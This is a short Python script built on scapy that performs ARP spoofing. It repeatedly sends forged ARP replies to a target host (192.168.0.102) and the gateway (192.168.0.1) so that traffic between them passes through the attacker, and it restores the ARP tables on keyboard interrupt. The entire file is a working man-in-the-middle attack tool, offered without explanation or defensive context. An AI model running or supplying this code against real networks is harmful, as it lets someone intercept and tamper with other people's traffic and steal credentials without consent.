import time
import scapy.all as scapy


def mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    Main_request = broadcast / arp_request 
    answered  = scapy.srp(Main_request, timeout=1,verbose = False)[0]
    
    return answered[0][1].hwsrc


def arp_spoof(target_ip, spoof_ip):

    target_mac=mac(target_ip)
    response_packet=scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(response_packet,verbose=False)

packet_count=0


def restore_back(destination_ip, source_ip):
    destination_mac=mac(destination_ip)
    source_mac=mac(source_ip)
    restore_packet=scapy.ARP(op=2,pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(restore_packet,verbose=False,count=4)

target_ip = '192.168.0.102'
gateway_ip = "192.168.0.1"

try:
    while True:
        arp_spoof('192.168.0.102','192.168.0.1')
        arp_spoof('192.168.0.1','192.168.0.102')
        packet_count=packet_count + 2
        print("\r[+]Packet sent: " + str(packet_count),end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Quitting and Resetting the ARP table........")
    restore_back(target_ip,gateway_ip)
    restore_back(gateway_ip,target_ip)